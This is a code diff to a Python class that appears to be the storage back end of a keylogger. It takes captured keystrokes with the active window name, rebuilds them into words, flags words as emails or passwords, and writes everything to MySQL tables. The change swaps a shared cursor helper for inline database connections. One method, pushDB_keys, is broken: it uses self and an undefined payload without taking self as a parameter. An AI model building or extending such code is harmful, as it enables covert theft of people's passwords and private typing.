@@ -1,4 +1,4 @@
-from load_config import load_cfg, db_cursor
+from load_config import load_cfg
 import mysql.connector
 import json
 
@@ -13,6 +13,7 @@ class Process:
             "isEmail": 0,
             "isPassword": 0
         }
+        self.cfg = load_cfg('./main_cfg.json')
         
     def addKey(self, data):
         payload = json.loads(data)
@@ -20,8 +21,17 @@ class Process:
         self.appendWord(payload)
     
     def pushDB_keys():
-        main_cfg, mycursor = db_cursor()
-        sql = f"INSERT INTO {main_cfg['dbKeyTable']} {main_cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s,%s, %s, %s)"
+        db = mysql.connector.connect (
+            host=self.cfg['dbHost'],
+            port=self.cfg['port'],
+            user=self.cfg['sqlUser'],
+            password=self.cfg['sqlPass'],
+            database=self.cfg['db']
+        )
+        
+        mycursor = db.cursor()
+
+        sql = f"INSERT INTO {self.cfg['dbKeyTable']} {self.cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s,%s, %s, %s)"
         val = (f"{payload['datetime']}", f"{payload['epochTime']}", f"{payload['isKeyDown']}", f"{payload['windowName']}", f"{payload['asciiCode']}", f"{payload['asciiChar']}", f"{payload['keyName']}", f"{payload['isCaps']}", f"{payload['processedKey']}")
   
         mycursor.execute(sql, val)
@@ -63,9 +73,17 @@ class Process:
     
     def pushDB_word(self):
     #push to table words
-        (main_cfg, mycursor) = db_cursor()
+        db = mysql.connector.connect (
+            host=self.cfg['dbHost'],
+            port=self.cfg['port'],
+            user=self.cfg['sqlUser'],
+            password=self.cfg['sqlPass'],
+            database=self.cfg['db']
+        )
+        
+        mycursor = db.cursor()
 
-        sql = f"INSERT INTO {main_cfg['dbWordTable']} {main_cfg['dbWordRows']} VALUES (%s, %s, %s, %s, %s, %s)"
+        sql = f"INSERT INTO {self.cfg['dbWordTable']} {self.cfg['dbWordRows']} VALUES (%s, %s, %s, %s, %s, %s)"
         val = (f"{self.payload['datetime']}", f"{self.payload['epoch']}", f"{self.payload['windowName']}", f"{self.payload['processedWord']}",f"{self.payload['isEmail']}", f"{self.payload['isPassword']}")
         
         print(sql,val)
